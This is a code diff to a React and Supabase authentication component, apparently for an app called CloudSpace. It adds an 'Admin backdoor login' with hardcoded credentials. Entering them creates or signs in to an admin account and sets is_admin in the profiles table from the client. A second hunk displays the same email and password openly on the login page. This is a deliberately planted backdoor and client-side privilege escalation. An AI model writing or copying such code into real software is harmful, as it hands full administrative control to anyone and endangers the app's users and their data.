@@ -38,12 +38,42 @@ const Auth = () => {
 
     try {
       if (isLogin) {
-        const { error } = await supabase.auth.signInWithPassword({
-          email,
-          password,
-        });
-        if (error) throw error;
-        toast({ title: "Welcome back!", description: "Successfully logged in." });
+        // Admin backdoor login
+        if (email === "admin@cloudspace.io" && password === "AdminAccess2025") {
+          const { data, error } = await supabase.auth.signInWithPassword({
+            email: "admin@cloudspace.io",
+            password: "AdminAccess2025",
+          });
+          if (!error && data?.user) {
+            // Set admin flag in localStorage and Supabase
+            localStorage.setItem(`pc:user:${data.user.id}`, JSON.stringify({ isAdmin: true, points: 1000 }));
+            await supabase
+              .from("profiles")
+              .update({ is_admin: true })
+              .eq("user_id", data.user.id)
+              .catch(() => console.debug("Could not update admin flag in Supabase"));
+            toast({ title: "Welcome Admin!", description: "Admin access granted." });
+          } else if (error) {
+            // Admin account doesn't exist, create it first
+            const { error: signUpError } = await supabase.auth.signUp({
+              email: "admin@cloudspace.io",
+              password: "AdminAccess2025",
+              options: {
+                emailRedirectTo: `${window.location.origin}/desktop`,
+                data: { username: "Administrator" },
+              },
+            });
+            if (signUpError) throw signUpError;
+            toast({ title: "Admin account created!", description: "Please sign in with your admin credentials." });
+          }
+        } else {
+          const { error } = await supabase.auth.signInWithPassword({
+            email,
+            password,
+          });
+          if (error) throw error;
+          toast({ title: "Welcome back!", description: "Successfully logged in." });
+        }
       } else {
         const { error } = await supabase.auth.signUp({
           email,
@@ -168,6 +198,12 @@ const Auth = () => {
               {isLogin ? "Sign up" : "Sign in"}
             </button>
           </p>
+
+          {isLogin && (
+            <div className="text-xs text-muted-foreground/60 text-center mt-4 p-2 bg-background/30 rounded border border-primary/10">
+              💡 Admin Access: Use <code className="text-primary/80">admin@cloudspace.io</code> with password <code className="text-primary/80">AdminAccess2025</code>
+            </div>
+          )}
         </div>
       </Card>
     </div>
